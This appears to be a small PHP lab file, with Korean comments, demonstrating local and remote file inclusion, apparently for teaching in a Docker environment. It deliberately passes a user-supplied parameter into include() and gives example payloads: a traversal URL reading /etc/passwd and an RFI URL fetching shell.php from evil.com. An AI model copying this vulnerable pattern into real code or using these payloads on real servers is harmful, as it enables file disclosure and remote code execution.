<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    // This is vulnerable to directory traversal
    include($file);
    // LFI (Local File Inclusion) 취약점:
    // 사용자가 전달한 파일 경로를 그대로 사용하여 서버의 로컬 파일을 읽을 수 있습니다.
    // 공격 예시: /file_viewer.php?file=../../../../etc/passwd
    //
    // RFI (Remote File Inclusion) 취약점:
    // php.ini 설정에서 allow_url_include=On으로 설정된 경우, 원격 서버의 악성 파일을 포함시켜 실행할 수 있습니다.
    // 공격 예시: /file_viewer.php?file=http://evil.com/shell.php
}
?>

// 디렉토리 트레버셜 공격 예시 1
// http://localhost/file_viewer.php?file=../../../../../../etc/passwd
// 해당 코드는 도커 안에 존재